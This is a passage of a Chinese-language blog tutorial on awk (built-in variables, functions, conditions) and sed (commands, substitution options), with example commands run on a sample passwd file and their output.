<li><code>RS</code>：行分隔符，用于分割每一行，默认是换行符。</li>
<li><code>OFS</code>：输出字段的分隔符，用于打印时分隔字段，默认为空格。</li>
<li><code>ORS</code>：输出记录的分隔符，用于打印时分隔记录，默认为换行符。</li>
<li><code>OFMT</code>：数字输出的格式，默认为<code>％.6g</code>。</li>
</ul>
<h5 id="函数">函数</h5>
<pre><code class="language-shell">$ awk -F ':' '{ print toupper($1) }' passwd 
SSHD
TCPDUMP
WANGQS
JENKINS
WANGQUNSONG
MYSQL
SONAR
</code></pre>
<p><code>awk</code>提供的内置函数如下，完整列表请查看<a href="https://www.gnu.org/software/gawk/manual/html_node/Built_002din.html#Built_002din">手册</a>。</p>
<ul>
<li><code>tolower()</code>：字符转为小写。</li>
<li><code>toupper()</code>：字符转为大写。</li>
<li><code>length()</code>：返回字符串长度。</li>
<li><code>substr()</code>：返回子字符串。</li>
<li><code>sin()</code>：正弦。</li>
<li><code>cos()</code>：余弦。</li>
<li><code>sqrt()</code>：平方根。</li>
<li><code>rand()</code>：随机数。</li>
</ul>
<h5 id="条件和判断">条件和判断</h5>
<p><code>awk</code>允许指定输出条件并输出：</p>
<pre><code class="language-shell">$ awk '条件 动作' 文件名
</code></pre>
<p>下面的例子，print前面是一个正则表达式，只输出包含<code>wang</code>的行。</p>
<pre><code class="language-shell">$ awk -F ':' '/wang/ { print $1 }' passwd   #只输出包含wang的行
wangqs
wangqunsong
$ awk -F ':' 'NR&gt;4  { print $1 }' passwd    #输出第4行以后的行
wangqunsong
mysql
sonar
</code></pre>
<p><code>awk</code>提供了<code>if</code>结构，用于编写复杂的条件。</p>
<pre><code class="language-shell">$ awk -F ':' '{ if ($1 &gt; &quot;n&quot;) print $1 }' passwd            #if
sshd
tcpdump
wangqs
wangqunsong
sonar
$ awk -F ':' '{ if ($1&gt;&quot;n&quot;) print $1; else print &quot;***&quot; }' passwd      #if-else
sshd
tcpdump
wangqs
***
wangqunsong
***
sonar
</code></pre>
<h4 id="3sed">3.sed</h4>
<h5 id="基本用法-3">基本用法</h5>
<p><code>sed</code>的命令格式为：</p>
<pre><code class="language-shell">sed [option] 'command' filename

[option]的常用选项有：
-f：在处理输入时，将file中指定的命令添加到已有的命令中
-e：直接在命令列模式上进行sed的动作编辑
-i：直接修改读取的文件内容，而不是输出到终端。
</code></pre>
<p>例如：</p>
<pre><code class="language-shell">$ echo &quot;This is a test&quot; | sed 's/test/big test/'   #替换
This is a big test

$ cat dada_1
this is a lazy dog
this is a lazy dog
this is a lazy dog
$ sed -e 's/lazy/big/; s/dog/cat/' data_1   #执行多个命令，用-e参数
this is a big cat
this is a big cat
this is a big cat

$ cat script_1
s/lazy/big/
s/dog/cat/
$ sed -f script_1 data_1   #使用-f参数读取文件中的命令,得到上述相同的效果
this is a big cat
this is a big cat
this is a big cat
</code></pre>
<p>命令参数为：</p>
<pre><code class="language-shell">a：追加，a的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)
i：插入，i的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)
d：以行为单位的删除
c：以行为单位的替换，c的后面可以接字串
s：在行中搜寻并替换，使用斜线间指定的第二个文本字符串来替换第一个文本字符串
p：以行为单位的显示，通常p会与参数sed -n一起运行
</code></pre>
<h5 id="替换选项">替换选项</h5>
<p>要记住的是：</p>
<ul>
<li>sed不会修改原始数据；</li>
<li>sed使用<code>s</code>替换时，默认只替换每行中出现的第一个文本，要想对一行中所有文本都起作用，需要使用<strong>替换选项</strong>，有如下几种替换选项：</li>
</ul>
<pre><code class="language-shell">  数字，表明新文本将替换第几处模式匹配的地方；
  g ，表明新文本将会替换所有匹配的文本；
  p ，表明原先行的内容要打印出来；
  w file ，将替换的结果写到文件中。
</code></pre>
<p>参考文档1：《Linux命令行与Shell脚本编程大全》</p>
<p>参考文档2：<a href="http://www.ruanyifeng.com/blog/2018/11/awk.html">awk入门教程</a></p>
]]></content>
    </entry>
</feed>